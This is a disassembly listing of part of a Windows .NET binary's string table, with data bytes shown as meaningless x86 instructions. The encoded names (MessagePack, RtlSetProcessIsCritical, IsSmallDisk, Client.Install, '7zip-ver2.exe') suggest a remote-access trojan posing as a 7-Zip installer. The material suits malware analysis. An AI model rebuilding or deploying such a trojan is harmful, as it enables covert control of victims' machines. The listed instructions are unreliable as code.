  4081cc:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081d2:	74 69                	je     0x40823d
  4081d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d6:	41                   	inc    %ecx
  4081d7:	74 74                	je     0x40824d
  4081d9:	72 69                	jb     0x408244
  4081db:	62 75 74             	bound  %esi,0x74(%ebp)
  4081de:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081e2:	73 65                	jae    0x408249
  4081e4:	6d                   	insl   (%dx),%es:(%edi)
  4081e5:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081e9:	65 73 63             	gs jae 0x40824f
  4081ec:	72 69                	jb     0x408257
  4081ee:	70 74                	jo     0x408264
  4081f0:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081f7:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081fe:	65 66 61             	gs popaw
  408201:	75 6c                	jne    0x40826f
  408203:	74 4d                	je     0x408252
  408205:	65 6d                	gs insl (%dx),%es:(%edi)
  408207:	62 65 72             	bound  %esp,0x72(%ebp)
  40820a:	41                   	inc    %ecx
  40820b:	74 74                	je     0x408281
  40820d:	72 69                	jb     0x408278
  40820f:	62 75 74             	bound  %esi,0x74(%ebp)
  408212:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408216:	6d                   	insl   (%dx),%es:(%edi)
  408217:	70 69                	jo     0x408282
  408219:	6c                   	insb   (%dx),%es:(%edi)
  40821a:	61                   	popa
  40821b:	74 69                	je     0x408286
  40821d:	6f                   	outsl  %ds:(%esi),(%dx)
  40821e:	6e                   	outsb  %ds:(%esi),(%dx)
  40821f:	52                   	push   %edx
  408220:	65 6c                	gs insb (%dx),%es:(%edi)
  408222:	61                   	popa
  408223:	78 61                	js     0x408286
  408225:	74 69                	je     0x408290
  408227:	6f                   	outsl  %ds:(%esi),(%dx)
  408228:	6e                   	outsb  %ds:(%esi),(%dx)
  408229:	73 41                	jae    0x40826c
  40822b:	74 74                	je     0x4082a1
  40822d:	72 69                	jb     0x408298
  40822f:	62 75 74             	bound  %esi,0x74(%ebp)
  408232:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408236:	73 65                	jae    0x40829d
  408238:	6d                   	insl   (%dx),%es:(%edi)
  408239:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40823d:	72 6f                	jb     0x4082ae
  40823f:	64 75 63             	fs jne 0x4082a5
  408242:	74 41                	je     0x408285
  408244:	74 74                	je     0x4082ba
  408246:	72 69                	jb     0x4082b1
  408248:	62 75 74             	bound  %esi,0x74(%ebp)
  40824b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40824f:	73 65                	jae    0x4082b6
  408251:	6d                   	insl   (%dx),%es:(%edi)
  408252:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408256:	6f                   	outsl  %ds:(%esi),(%dx)
  408257:	70 79                	jo     0x4082d2
  408259:	72 69                	jb     0x4082c4
  40825b:	67 68 74 41 74 74    	addr16 push $0x74744174
  408261:	72 69                	jb     0x4082cc
  408263:	62 75 74             	bound  %esi,0x74(%ebp)
  408266:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40826a:	73 65                	jae    0x4082d1
  40826c:	6d                   	insl   (%dx),%es:(%edi)
  40826d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408271:	6f                   	outsl  %ds:(%esi),(%dx)
  408272:	6d                   	insl   (%dx),%es:(%edi)
  408273:	70 61                	jo     0x4082d6
  408275:	6e                   	outsb  %ds:(%esi),(%dx)
  408276:	79 41                	jns    0x4082b9
  408278:	74 74                	je     0x4082ee
  40827a:	72 69                	jb     0x4082e5
  40827c:	62 75 74             	bound  %esi,0x74(%ebp)
  40827f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408283:	6e                   	outsb  %ds:(%esi),(%dx)
  408284:	74 69                	je     0x4082ef
  408286:	6d                   	insl   (%dx),%es:(%edi)
  408287:	65 43                	gs inc %ebx
  408289:	6f                   	outsl  %ds:(%esi),(%dx)
  40828a:	6d                   	insl   (%dx),%es:(%edi)
  40828b:	70 61                	jo     0x4082ee
  40828d:	74 69                	je     0x4082f8
  40828f:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408292:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408299:	69 
  40829a:	62 75 74             	bound  %esi,0x74(%ebp)
  40829d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4082a1:	74 5f                	je     0x408302
  4082a3:	55                   	push   %ebp
  4082a4:	73 65                	jae    0x40830b
  4082a6:	53                   	push   %ebx
  4082a7:	68 65 6c 6c 45       	push   $0x456c6c65
  4082ac:	78 65                	js     0x408313
  4082ae:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082b1:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082b5:	61                   	popa
  4082b6:	64 42                	fs inc %edx
  4082b8:	79 74                	jns    0x40832e
  4082ba:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082be:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082c5:	00 
  4082c6:	44                   	inc    %esp
  4082c7:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c9:	65 74 65             	gs je  0x408331
  4082cc:	56                   	push   %esi
  4082cd:	61                   	popa
  4082ce:	6c                   	insb   (%dx),%es:(%edi)
  4082cf:	75 65                	jne    0x408336
  4082d1:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d5:	65 72 56             	gs jb  0x40832e
  4082d8:	61                   	popa
  4082d9:	6c                   	insb   (%dx),%es:(%edi)
  4082da:	75 65                	jne    0x408341
  4082dc:	00 47 65             	add    %al,0x65(%edi)
  4082df:	74 56                	je     0x408337
  4082e1:	61                   	popa
  4082e2:	6c                   	insb   (%dx),%es:(%edi)
  4082e3:	75 65                	jne    0x40834a
  4082e5:	00 53 65             	add    %dl,0x65(%ebx)
  4082e8:	74 56                	je     0x408340
  4082ea:	61                   	popa
  4082eb:	6c                   	insb   (%dx),%es:(%edi)
  4082ec:	75 65                	jne    0x408353
  4082ee:	00 76 61             	add    %dh,0x61(%esi)
  4082f1:	6c                   	insb   (%dx),%es:(%edi)
  4082f2:	75 65                	jne    0x408359
  4082f4:	00 67 65             	add    %ah,0x65(%edi)
  4082f7:	74 5f                	je     0x408358
  4082f9:	4b                   	dec    %ebx
  4082fa:	65 65 70 41          	gs gs jo 0x40833f
  4082fe:	6c                   	insb   (%dx),%es:(%edi)
  4082ff:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408306:	5f                   	pop    %edi
  408307:	4b                   	dec    %ebx
  408308:	65 65 70 41          	gs gs jo 0x40834d
  40830c:	6c                   	insb   (%dx),%es:(%edi)
  40830d:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408314:	6f                   	outsl  %ds:(%esi),(%dx)
  408315:	76 65                	jbe    0x40837c
  408317:	00 37                	add    %dh,(%edi)
  408319:	7a 69                	jp     0x408384
  40831b:	70 2d                	jo     0x40834a
  40831d:	76 65                	jbe    0x408384
  40831f:	72 32                	jb     0x408353
  408321:	2e 65 78 65          	cs js,pn 0x40838a
  408325:	00 73 65             	add    %dh,0x65(%ebx)
  408328:	74 5f                	je     0x408389
  40832a:	42                   	inc    %edx
  40832b:	6c                   	insb   (%dx),%es:(%edi)
  40832c:	6f                   	outsl  %ds:(%esi),(%dx)
  40832d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408330:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408337:	5f                   	pop    %edi
  408338:	54                   	push   %esp
  408339:	6f                   	outsl  %ds:(%esi),(%dx)
  40833a:	74 61                	je     0x40839d
  40833c:	6c                   	insb   (%dx),%es:(%edi)
  40833d:	53                   	push   %ebx
  40833e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408345:	5f                   	pop    %edi
  408346:	48                   	dec    %eax
  408347:	65 61                	gs popa
  408349:	64 65 72 53          	fs gs jb 0x4083a0
  40834d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408354:	5f                   	pop    %edi
  408355:	48                   	dec    %eax
  408356:	65 61                	gs popa
  408358:	64 65 72 53          	fs gs jb 0x4083af
  40835c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408363:	5f                   	pop    %edi
  408364:	53                   	push   %ebx
  408365:	65 6e                	outsb  %gs:(%esi),(%dx)
  408367:	64 42                	fs inc %edx
  408369:	75 66                	jne    0x4083d1
  40836b:	66 65 72 53          	data16 gs jb 0x4083c2
  40836f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408376:	5f                   	pop    %edi
  408377:	52                   	push   %edx
  408378:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40837c:	76 65                	jbe    0x4083e3
  40837e:	42                   	inc    %edx
  40837f:	75 66                	jne    0x4083e7
  408381:	66 65 72 53          	data16 gs jb 0x4083d8
  408385:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40838c:	5f                   	pop    %edi
  40838d:	4b                   	dec    %ebx
  40838e:	65 79 53             	gs jns 0x4083e4
  408391:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408398:	65 78 4f             	gs js  0x4083ea
  40839b:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40839f:	72 46                	jb     0x4083e7
  4083a1:	6c                   	insb   (%dx),%es:(%edi)
  4083a2:	61                   	popa
  4083a3:	67 00 43 72          	add    %al,0x72(%bp,%di)
  4083a7:	79 70                	jns    0x408419
  4083a9:	74 6f                	je     0x40841a
  4083ab:	43                   	inc    %ebx
  4083ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4083ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ae:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083b4:	74 5f                	je     0x408415
  4083b6:	50                   	push   %eax
  4083b7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083be:	5f                   	pop    %edi
  4083bf:	50                   	push   %eax
  4083c0:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083c7:	74 65                	je     0x40842e
  4083c9:	6d                   	insl   (%dx),%es:(%edi)
  4083ca:	2e 54                	cs push %esp
  4083cc:	68 72 65 61 64       	push   $0x64616572
  4083d1:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083d8:	5f                   	pop    %edi
  4083d9:	50                   	push   %eax
  4083da:	61                   	popa
  4083db:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083e2:	64 64 
  4083e4:	5f                   	pop    %edi
  4083e5:	53                   	push   %ebx
  4083e6:	65 73 73             	gs jae 0x40845c
  4083e9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f1:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083f5:	73 74                	jae    0x40846b
  4083f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4083f9:	45                   	inc    %ebp
  4083fa:	76 65                	jbe    0x408461
  4083fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fd:	74 73                	je     0x408472
  4083ff:	5f                   	pop    %edi
  408400:	53                   	push   %ebx
  408401:	65 73 73             	gs jae 0x408477
  408404:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40840b:	6e                   	outsb  %ds:(%esi),(%dx)
  40840c:	67 00 55 54          	add    %dl,0x54(%di)
  408410:	46                   	inc    %esi
  408411:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408414:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408417:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40841e:	74 65                	je     0x408485
  408420:	6d                   	insl   (%dx),%es:(%edi)
  408421:	2e 44                	cs inc %esp
  408423:	72 61                	jb     0x408486
  408425:	77 69                	ja     0x408490
  408427:	6e                   	outsb  %ds:(%esi),(%dx)
  408428:	67 2e 49             	addr16 cs dec %ecx
  40842b:	6d                   	insl   (%dx),%es:(%edi)
  40842c:	61                   	popa
  40842d:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408434:	73 
  408435:	74 65                	je     0x40849c
  408437:	6d                   	insl   (%dx),%es:(%edi)
  408438:	2e 52                	cs push %edx
  40843a:	75 6e                	jne    0x4084aa
  40843c:	74 69                	je     0x4084a7
  40843e:	6d                   	insl   (%dx),%es:(%edi)
  40843f:	65 2e 56             	gs cs push %esi
  408442:	65 72 73             	gs jb  0x4084b8
  408445:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40844c:	46                   	inc    %esi
  40844d:	72 6f                	jb     0x4084be
  40844f:	6d                   	insl   (%dx),%es:(%edi)
  408450:	42                   	inc    %edx
  408451:	61                   	popa
  408452:	73 65                	jae    0x4084b9
  408454:	36 34 53             	ss xor $0x53,%al
  408457:	74 72                	je     0x4084cb
  408459:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408460:	61                   	popa
  408461:	73 65                	jae    0x4084c8
  408463:	36 34 53             	ss xor $0x53,%al
  408466:	74 72                	je     0x4084da
  408468:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40846f:	64 53                	fs push %ebx
  408471:	74 72                	je     0x4084e5
  408473:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40847a:	6e                   	outsb  %ds:(%esi),(%dx)
  40847b:	6c                   	insb   (%dx),%es:(%edi)
  40847c:	6f                   	outsl  %ds:(%esi),(%dx)
  40847d:	61                   	popa
  40847e:	64 53                	fs push %ebx
  408480:	74 72                	je     0x4084f4
  408482:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408489:	74 65                	je     0x4084f0
  40848b:	53                   	push   %ebx
  40848c:	74 72                	je     0x408500
  40848e:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408495:	74 72                	je     0x408509
  408497:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40849e:	5f                   	pop    %edi
  40849f:	41                   	inc    %ecx
  4084a0:	73 53                	jae    0x4084f5
  4084a2:	74 72                	je     0x408516
  4084a4:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084ab:	5f                   	pop    %edi
  4084ac:	41                   	inc    %ecx
  4084ad:	73 53                	jae    0x408502
  4084af:	74 72                	je     0x408523
  4084b1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084b8:	65 73 41             	gs jae 0x4084fc
  4084bb:	73 53                	jae    0x408510
  4084bd:	74 72                	je     0x408531
  4084bf:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084c6:	41                   	inc    %ecx
  4084c7:	73 53                	jae    0x40851c
  4084c9:	74 72                	je     0x40853d
  4084cb:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084d2:	41                   	inc    %ecx
  4084d3:	73 53                	jae    0x408528
  4084d5:	74 72                	je     0x408549
  4084d7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084de:	53                   	push   %ebx
  4084df:	74 72                	je     0x408553
  4084e1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084e8:	65 73 41             	gs jae 0x40852c
  4084eb:	73 48                	jae    0x408535
  4084ed:	65 78 53             	gs js  0x408543
  4084f0:	74 72                	je     0x408564
  4084f2:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084f9:	73 74                	jae    0x40856f
  4084fb:	72 69                	jb     0x408566
  4084fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fe:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408502:	73 74                	jae    0x408578
  408504:	65 6d                	gs insl (%dx),%es:(%edi)
  408506:	2e 44                	cs inc %esp
  408508:	72 61                	jb     0x40856b
  40850a:	77 69                	ja     0x408575
  40850c:	6e                   	outsb  %ds:(%esi),(%dx)
  40850d:	67 00 67 65          	add    %ah,0x65(%bx)
  408511:	74 5f                	je     0x408572
  408513:	41                   	inc    %ecx
  408514:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408518:	61                   	popa
  408519:	74 65                	je     0x408580
  40851b:	50                   	push   %eax
  40851c:	6f                   	outsl  %ds:(%esi),(%dx)
  40851d:	6e                   	outsb  %ds:(%esi),(%dx)
  40851e:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408522:	74 5f                	je     0x408583
  408524:	41                   	inc    %ecx
  408525:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408529:	61                   	popa
  40852a:	74 65                	je     0x408591
  40852c:	50                   	push   %eax
  40852d:	6f                   	outsl  %ds:(%esi),(%dx)
  40852e:	6e                   	outsb  %ds:(%esi),(%dx)
  40852f:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408533:	74 5f                	je     0x408594
  408535:	45                   	inc    %ebp
  408536:	72 72                	jb     0x4085aa
  408538:	6f                   	outsl  %ds:(%esi),(%dx)
  408539:	72 44                	jb     0x40857f
  40853b:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408542:	73 67                	jae    0x4085ab
  408544:	00 43 6f             	add    %al,0x6f(%ebx)
  408547:	6d                   	insl   (%dx),%es:(%edi)
  408548:	70 75                	jo     0x4085bf
  40854a:	74 65                	je     0x4085b1
  40854c:	48                   	dec    %eax
  40854d:	61                   	popa
  40854e:	73 68                	jae    0x4085b8
  408550:	00 73 74             	add    %dh,0x74(%ebx)
  408553:	72 54                	jb     0x4085a9
  408555:	6f                   	outsl  %ds:(%esi),(%dx)
  408556:	48                   	dec    %eax
  408557:	61                   	popa
  408558:	73 68                	jae    0x4085c2
  40855a:	00 47 65             	add    %al,0x65(%edi)
  40855d:	74 48                	je     0x4085a7
  40855f:	61                   	popa
  408560:	73 68                	jae    0x4085ca
  408562:	00 56 65             	add    %dl,0x65(%esi)
  408565:	72 69                	jb     0x4085d0
  408567:	66 79 48             	data16 jns 0x4085b2
  40856a:	61                   	popa
  40856b:	73 68                	jae    0x4085d5
  40856d:	00 46 6c             	add    %al,0x6c(%esi)
  408570:	75 73                	jne    0x4085e5
  408572:	68 00 67 65 74       	push   $0x74656700
  408577:	5f                   	pop    %edi
  408578:	45                   	inc    %ebp
  408579:	78 65                	js     0x4085e0
  40857b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40857e:	61                   	popa
  40857f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408583:	61                   	popa
  408584:	74 68                	je     0x4085ee
  408586:	00 47 65             	add    %al,0x65(%edi)
  408589:	74 54                	je     0x4085df
  40858b:	65 6d                	gs insl (%dx),%es:(%edi)
  40858d:	70 50                	jo     0x4085df
  40858f:	61                   	popa
  408590:	74 68                	je     0x4085fa
  408592:	00 70 61             	add    %dh,0x61(%eax)
  408595:	74 68                	je     0x4085ff
  408597:	00 48 6d             	add    %cl,0x6d(%eax)
  40859a:	61                   	popa
  40859b:	63 53 68             	arpl   %edx,0x68(%ebx)
  40859e:	61                   	popa
  40859f:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  4085a5:	67 74 68             	addr16 je 0x408610
  4085a8:	00 67 65             	add    %ah,0x65(%edi)
  4085ab:	74 5f                	je     0x40860c
  4085ad:	4c                   	dec    %esp
  4085ae:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b0:	67 74 68             	addr16 je 0x40861b
  4085b3:	00 49 76             	add    %cl,0x76(%ecx)
  4085b6:	4c                   	dec    %esp
  4085b7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b9:	67 74 68             	addr16 je 0x408624
  4085bc:	00 41 75             	add    %al,0x75(%ecx)
  4085bf:	74 68                	je     0x408629
  4085c1:	4b                   	dec    %ebx
  4085c2:	65 79 4c             	gs jns 0x408611
  4085c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085c7:	67 74 68             	addr16 je 0x408632
  4085ca:	00 55 72             	add    %dl,0x72(%ebp)
  4085cd:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085d3:	00 6d 73             	add    %ch,0x73(%ebp)
  4085d6:	67 70 61             	addr16 jo 0x40863a
  4085d9:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085dc:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085df:	6c                   	insb   (%dx),%es:(%edi)
  4085e0:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e8:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085eb:	4d                   	dec    %ebp
  4085ec:	65 73 73             	gs jae 0x408662
  4085ef:	61                   	popa
  4085f0:	67 65 50             	addr16 gs push %eax
  4085f3:	61                   	popa
  4085f4:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085f7:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085fe:	61                   	popa
  4085ff:	67 65 50             	addr16 gs push %eax
  408602:	61                   	popa
  408603:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408606:	4d                   	dec    %ebp
  408607:	73 67                	jae    0x408670
  408609:	50                   	push   %eax
  40860a:	61                   	popa
  40860b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40860e:	41                   	inc    %ecx
  40860f:	73 79                	jae    0x40868a
  408611:	6e                   	outsb  %ds:(%esi),(%dx)
  408612:	63 43 61             	arpl   %eax,0x61(%ebx)
  408615:	6c                   	insb   (%dx),%es:(%edi)
  408616:	6c                   	insb   (%dx),%es:(%edi)
  408617:	62 61 63             	bound  %esp,0x63(%ecx)
  40861a:	6b 00 52             	imul   $0x52,(%eax),%eax
  40861d:	65 6d                	gs insl (%dx),%es:(%edi)
  40861f:	6f                   	outsl  %ds:(%esi),(%dx)
  408620:	74 65                	je     0x408687
  408622:	43                   	inc    %ebx
  408623:	65 72 74             	gs jb  0x40869a
  408626:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40862d:	56                   	push   %esi
  40862e:	61                   	popa
  40862f:	6c                   	insb   (%dx),%es:(%edi)
  408630:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408637:	43 
  408638:	61                   	popa
  408639:	6c                   	insb   (%dx),%es:(%edi)
  40863a:	6c                   	insb   (%dx),%es:(%edi)
  40863b:	62 61 63             	bound  %esp,0x63(%ecx)
  40863e:	6b 00 54             	imul   $0x54,(%eax),%eax
  408641:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408648:	6c                   	insb   (%dx),%es:(%edi)
  408649:	62 61 63             	bound  %esp,0x63(%ecx)
  40864c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40864f:	6e                   	outsb  %ds:(%esi),(%dx)
  408650:	70 61                	jo     0x4086b3
  408652:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408655:	6d                   	insl   (%dx),%es:(%edi)
  408656:	73 67                	jae    0x4086bf
  408658:	70 61                	jo     0x4086bb
  40865a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40865d:	52                   	push   %edx
  40865e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408665:	4b 65 
  408667:	79 50                	jns    0x4086b9
  408669:	65 72 6d             	gs jb  0x4086d9
  40866c:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408673:	68 65 63 6b 00       	push   $0x6b6365
  408678:	46                   	inc    %esi
  408679:	6c                   	insb   (%dx),%es:(%edi)
  40867a:	75 73                	jne    0x4086ef
  40867c:	68 46 69 6e 61       	push   $0x616e6946
  408681:	6c                   	insb   (%dx),%es:(%edi)
  408682:	42                   	inc    %edx
  408683:	6c                   	insb   (%dx),%es:(%edi)
  408684:	6f                   	outsl  %ds:(%esi),(%dx)
  408685:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408688:	49                   	dec    %ecx
  408689:	73 53                	jae    0x4086de
  40868b:	6d                   	insl   (%dx),%es:(%edi)
  40868c:	61                   	popa
  40868d:	6c                   	insb   (%dx),%es:(%edi)
  40868e:	6c                   	insb   (%dx),%es:(%edi)
  40868f:	44                   	inc    %esp
  408690:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408697:	6c                   	insb   (%dx),%es:(%edi)
  408698:	00 66 56             	add    %ah,0x56(%esi)
  40869b:	61                   	popa
  40869c:	6c                   	insb   (%dx),%es:(%edi)
  40869d:	00 69 56             	add    %ch,0x56(%ecx)
  4086a0:	61                   	popa
  4086a1:	6c                   	insb   (%dx),%es:(%edi)
  4086a2:	00 73 74             	add    %dh,0x74(%ebx)
  4086a5:	72 56                	jb     0x4086fd
  4086a7:	61                   	popa
  4086a8:	6c                   	insb   (%dx),%es:(%edi)
  4086a9:	00 52 74             	add    %dl,0x74(%edx)
  4086ac:	6c                   	insb   (%dx),%es:(%edi)
  4086ad:	53                   	push   %ebx
  4086ae:	65 74 50             	gs je  0x408701
  4086b1:	72 6f                	jb     0x408722
  4086b3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086b6:	73 49                	jae    0x408701
  4086b8:	73 43                	jae    0x4086fd
  4086ba:	72 69                	jb     0x408725
  4086bc:	74 69                	je     0x408727
  4086be:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c1:	00 50 72             	add    %dl,0x72(%eax)
  4086c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086c8:	73 43                	jae    0x40870d
  4086ca:	72 69                	jb     0x408735
  4086cc:	74 69                	je     0x408737
  4086ce:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086d1:	00 4e 65             	add    %cl,0x65(%esi)
  4086d4:	74 77                	je     0x40874d
  4086d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4086d7:	72 6b                	jb     0x408744
  4086d9:	43                   	inc    %ebx
  4086da:	72 65                	jb     0x408741
  4086dc:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086df:	74 69                	je     0x40874a
  4086e1:	61                   	popa
  4086e2:	6c                   	insb   (%dx),%es:(%edi)
  4086e3:	00 53 79             	add    %dl,0x79(%ebx)
  4086e6:	73 74                	jae    0x40875c
  4086e8:	65 6d                	gs insl (%dx),%es:(%edi)
  4086ea:	2e 53                	cs push %ebx
  4086ec:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086f0:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086f7:	6e 
  4086f8:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086fb:	61                   	popa
  4086fc:	6c                   	insb   (%dx),%es:(%edi)
  4086fd:	00 57 69             	add    %dl,0x69(%edi)
  408700:	6e                   	outsb  %ds:(%esi),(%dx)
  408701:	64 6f                	outsl  %fs:(%esi),(%dx)
  408703:	77 73                	ja     0x408778
  408705:	50                   	push   %eax
  408706:	72 69                	jb     0x408771
  408708:	6e                   	outsb  %ds:(%esi),(%dx)
  408709:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40870c:	61                   	popa
  40870d:	6c                   	insb   (%dx),%es:(%edi)
  40870e:	00 41 72             	add    %al,0x72(%ecx)
  408711:	65 45                	gs inc %ebp
  408713:	71 75                	jno    0x40878a
  408715:	61                   	popa
  408716:	6c                   	insb   (%dx),%es:(%edi)
  408717:	00 67 65             	add    %ah,0x65(%edi)
  40871a:	74 5f                	je     0x40877b
  40871c:	49                   	dec    %ecx
  40871d:	6e                   	outsb  %ds:(%esi),(%dx)
  40871e:	74 65                	je     0x408785
  408720:	72 76                	jb     0x408798
  408722:	61                   	popa
  408723:	6c                   	insb   (%dx),%es:(%edi)
  408724:	00 73 65             	add    %dh,0x65(%ebx)
  408727:	74 5f                	je     0x408788
  408729:	49                   	dec    %ecx
  40872a:	6e                   	outsb  %ds:(%esi),(%dx)
  40872b:	74 65                	je     0x408792
  40872d:	72 76                	jb     0x4087a5
  40872f:	61                   	popa
  408730:	6c                   	insb   (%dx),%es:(%edi)
  408731:	00 43 6c             	add    %al,0x6c(%ebx)
  408734:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40873b:	73 74                	jae    0x4087b1
  40873d:	61                   	popa
  40873e:	6c                   	insb   (%dx),%es:(%edi)
  40873f:	6c                   	insb   (%dx),%es:(%edi)
  408740:	00 6b 65             	add    %ch,0x65(%ebx)
  408743:	72 6e                	jb     0x4087b3
  408745:	65 6c                	gs insb (%dx),%es:(%edi)
  408747:	33 32                	xor    (%edx),%esi
  408749:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40874c:	6c                   	insb   (%dx),%es:(%edi)
